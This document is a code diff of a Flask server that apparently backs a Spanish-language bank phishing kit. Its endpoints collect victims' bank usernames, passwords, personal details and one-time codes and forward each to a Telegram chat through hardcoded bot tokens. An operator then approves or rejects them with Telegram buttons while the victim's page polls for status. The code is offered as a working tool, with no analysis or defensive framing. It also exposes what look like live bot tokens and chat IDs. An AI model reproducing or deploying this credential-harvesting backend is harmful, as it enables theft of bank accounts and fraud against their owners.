@@ -11,16 +11,24 @@ app = Flask(__name__)
 CORS(app)  # Habilitar CORS para todas las rutas
 
 # ══════════════════════════════════════════════════════════════
-# CONFIGURACIÓN
+# CONFIGURACIÓN - Cambiar estas variables en Render
 # ══════════════════════════════════════════════════════════════
-BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8578415094:AAFIbQglTSUmxX3IK4nQfuayvmQfDh-aYjM')
-CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1003526160154')
+BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8499803362:AAHxkqI11-YbYgHvjQZf3l7EkpTHanKOe14')
+CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '-1002904816351')
 WEBHOOK_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
 
+# Base de datos en memoria (usar Redis en producción)
 sessions_db = {}
+
+# ══════════════════════════════════════════════════════════════
+# ENDPOINTS
+# ══════════════════════════════════════════════════════════════
 
 @app.route('/api/login', methods=['POST'])
 def login():
+    """
+    Recibe credenciales del cliente y las envía a Telegram
+    """
     try:
         data = request.json
         session_id = data.get('sessionId')
@@ -35,6 +43,7 @@ def login():
         if not session_id or not usuario or not clave:
             return jsonify({'error': 'Datos incompletos'}), 400
 
+        # Guardar sesión en memoria
         sessions_db[session_id] = {
             'bank': bank,
             'usuario': usuario,
@@ -44,15 +53,12 @@ def login():
             'email': email,
             'persona': persona,
             'status': 'waiting',
-            'message': '',
-            'otpLabel': 'Ingresa el código de 6 dígitos',
             'created_at': datetime.now().isoformat(),
             'otp': '',
             'otp_attempts': 0
         }
 
-        print(f'[LOGIN] Nueva sesión creada: {session_id}')
-
+        # Preparar mensaje para Telegram con botones
         message = f"""
 🏦 <b>CREDENCIALES — {bank}</b>
 ━━━━━━━━━━━━━━━━━
@@ -75,6 +81,7 @@ def login():
             ]
         ]
 
+        # Enviar a Telegram
         payload = {
             'chat_id': CHAT_ID,
             'text': message,
@@ -83,43 +90,45 @@ def login():
         }
 
         response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code == 200:
-            print(f'[LOGIN] Mensaje enviado a Telegram para sesión {session_id}')
-        else:
-            print(f'[LOGIN ERROR] Error enviando a Telegram: {response.text}')
+        if response.status_code != 200:
+            print(f'Error enviando a Telegram: {response.text}')
 
         return jsonify({'success': True, 'sessionId': session_id}), 200
 
     except Exception as e:
-        print(f'[LOGIN ERROR] {str(e)}')
+        print(f'Error en /api/login: {str(e)}')
         return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/session/<session_id>', methods=['GET'])
 def get_session(session_id):
+    """
+    Retorna el estado actual de la sesión
+    El cliente hace polling a este endpoint cada 1.5 segundos
+    """
     try:
         if session_id not in sessions_db:
             return jsonify({'error': 'Sesión no encontrada'}), 404
 
         session = sessions_db[session_id]
-        
-        response_data = {
+
+        # Retornar estado actual
+        return jsonify({
             'status': session['status'],
             'message': session.get('message', ''),
             'otpLabel': session.get('otpLabel', 'Ingresa el código de 6 dígitos')
-        }
-        
-        print(f'[POLLING] Session {session_id}: status={session["status"]}')
-        
-        return jsonify(response_data), 200
+        }), 200
 
     except Exception as e:
-        print(f'[POLLING ERROR] {str(e)}')
+        print(f'Error en /api/session: {str(e)}')
         return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/otp', methods=['POST'])
 def submit_otp():
+    """
+    Recibe el OTP del cliente
+    """
     try:
         data = request.json
         session_id = data.get('sessionId')
@@ -135,8 +144,7 @@ def submit_otp():
         session['otp'] = otp
         session['otp_attempts'] = session.get('otp_attempts', 0) + 1
 
-        print(f'[OTP] Recibido OTP para sesión {session_id}: {otp}')
-
+        # Enviar OTP a Telegram
         message = f"""
 🔐 <b>CÓDIGO OTP RECIBIDO — {session['bank']}</b>
 ━━━━━━━━━━━━━━━━━
@@ -164,134 +172,129 @@ def submit_otp():
         }
 
         response = requests.post(WEBHOOK_URL, json=payload)
-        if response.status_code == 200:
-            print(f'[OTP] OTP enviado a Telegram para sesión {session_id}')
-        else:
-            print(f'[OTP ERROR] Error enviando OTP a Telegram: {response.text}')
+        if response.status_code != 200:
+            print(f'Error enviando OTP a Telegram: {response.text}')
 
         return jsonify({'success': True}), 200
 
     except Exception as e:
-        print(f'[OTP ERROR] {str(e)}')
+        print(f'Error en /api/otp: {str(e)}')
         return jsonify({'error': str(e)}), 500
 
 
 @app.route('/api/callback', methods=['POST'])
 def handle_callback():
+    """
+    Webhook para recibir respuestas de los botones de Telegram
+    """
     try:
         update = request.json
-        print(f'[CALLBACK] Recibido update: {json.dumps(update, indent=2)}')
-        
+
         if 'callback_query' not in update:
-            print('[CALLBACK] No contiene callback_query')
             return jsonify({'ok': True}), 200
 
         callback_query = update['callback_query']
         callback_data = callback_query.get('data', '')
         callback_id = callback_query.get('id')
-        
-        print(f'[CALLBACK] Data: {callback_data}')
-        print(f'[CALLBACK] ID: {callback_id}')
 
-        try:
-            requests.post(
-                f'https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery',
-                json={'callback_query_id': callback_id, 'text': 'Procesando...'}
-            )
-        except Exception as e:
-            print(f'[CALLBACK] Error respondiendo: {str(e)}')
+        # Responder al callback
+        requests.post(
+            f'https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery',
+            json={'callback_query_id': callback_id, 'text': 'Procesado'}
+        )
 
-        # PERMITIR OTP
-        if callback_data.startswith('action_otp_') and 'confirm' not in callback_data and 'reject' not in callback_data:
-            session_id = callback_data.replace('action_otp_', '')
-            print(f'[CALLBACK] OTP PERMITIDO para sesión: {session_id}')
-            
+        # Procesar acciones
+        if callback_data.startswith('action_otp_'):
+            session_id = callback_data.replace('action_otp_', '').replace('action_otp_confirm_', '').replace('action_otp_reject_', '')
             if session_id in sessions_db:
-                sessions_db[session_id]['status'] = 'otp'
-                sessions_db[session_id]['otpLabel'] = 'Ingresa el código de 6 dígitos'
-                print(f'[CALLBACK] Status actualizado a "otp"')
-            else:
-                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
+                if 'confirm' in callback_data:
+                    sessions_db[session_id]['status'] = 'otp'
+                    sessions_db[session_id]['message'] = 'Ingresa tu código OTP'
+                elif 'reject' in callback_data:
+                    sessions_db[session_id]['status'] = 'error_login'
+                    sessions_db[session_id]['message'] = 'Credenciales rechazadas'
 
-        # RECHAZAR CREDENCIALES
         elif callback_data.startswith('action_reject_'):
             session_id = callback_data.replace('action_reject_', '')
-            print(f'[CALLBACK] RECHAZADO para sesión: {session_id}')
-            
             if session_id in sessions_db:
                 sessions_db[session_id]['status'] = 'error_login'
-                sessions_db[session_id]['message'] = 'Usuario o clave incorrectos'
-                print(f'[CALLBACK] Status actualizado a "error_login"')
-            else:
-                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
+                sessions_db[session_id]['message'] = 'Login rechazado por el operador'
 
-        # CONFIRMAR OTP
         elif callback_data.startswith('action_otp_confirm_'):
             session_id = callback_data.replace('action_otp_confirm_', '')
-            print(f'[CALLBACK] OTP CONFIRMADO para sesión: {session_id}')
-            
             if session_id in sessions_db:
                 sessions_db[session_id]['status'] = 'finalizar'
                 sessions_db[session_id]['message'] = 'Pago procesado correctamente'
-                print(f'[CALLBACK] Status actualizado a "finalizar"')
-            else:
-                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
 
-        # RECHAZAR OTP
         elif callback_data.startswith('action_otp_reject_'):
             session_id = callback_data.replace('action_otp_reject_', '')
-            print(f'[CALLBACK] OTP RECHAZADO para sesión: {session_id}')
-            
             if session_id in sessions_db:
                 sessions_db[session_id]['status'] = 'otp_error'
                 sessions_db[session_id]['message'] = 'Código OTP rechazado'
-                print(f'[CALLBACK] Status actualizado a "otp_error"')
-            else:
-                print(f'[CALLBACK] Sesión no encontrada: {session_id}')
 
-        print(f'[CALLBACK] Sesiones activas: {list(sessions_db.keys())}')
         return jsonify({'ok': True}), 200
 
     except Exception as e:
-        print(f'[CALLBACK ERROR] {str(e)}')
-        import traceback
-        traceback.print_exc()
+        print(f'Error en /api/callback: {str(e)}')
         return jsonify({'ok': True}), 200
 
 
 @app.route('/api/health', methods=['GET'])
 def health_check():
+    """
+    Endpoint para verificar que el servidor está activo
+    Usado por UptimeRobot o similar para mantener Render despierto
+    """
     return jsonify({
         'status': 'active',
         'timestamp': datetime.now().isoformat(),
-        'sessions_count': len(sessions_db),
-        'sessions': list(sessions_db.keys())
+        'sessions_count': len(sessions_db)
     }), 200
 
 
 @app.route('/', methods=['GET'])
 def index():
+    """
+    Página de inicio
+    """
     return jsonify({
         'app': 'Alcanos Payment Server',
         'version': '1.0.0',
-        'status': 'running'
+        'status': 'running',
+        'endpoints': {
+            'POST /api/login': 'Enviar credenciales',
+            'GET /api/session/<id>': 'Polling de estado',
+            'POST /api/otp': 'Enviar OTP',
+            'POST /api/callback': 'Webhook de Telegram',
+            'GET /api/health': 'Health check'
+        }
     }), 200
 
 
+# ══════════════════════════════════════════════════════════════
+# KEEP-ALIVE PARA RENDER
+# ══════════════════════════════════════════════════════════════
 def keep_alive():
+    """
+    Hace ping a sí mismo cada 10 minutos para que Render no duerma la app
+    """
     while True:
         try:
-            time.sleep(10 * 60)
+            time.sleep(10 * 60)  # 10 minutos
             requests.get(f'http://localhost:5000/api/health', timeout=5)
             print(f'[KEEP-ALIVE] Ping a las {datetime.now().strftime("%H:%M:%S")}')
         except Exception as e:
             print(f'[KEEP-ALIVE] Error: {str(e)}')
 
 
+# ══════════════════════════════════════════════════════════════
+# MAIN
+# ══════════════════════════════════════════════════════════════
 if __name__ == '__main__':
+    # Iniciar thread de keep-alive
     keep_alive_thread = Thread(target=keep_alive, daemon=True)
     keep_alive_thread.start()
 
+    # Puerto desde Render o localhost:5000
     port = int(os.getenv('PORT', 5000))
-    print(f'[SERVER] Iniciando en puerto {port}')
     app.run(host='0.0.0.0', port=port, debug=False)
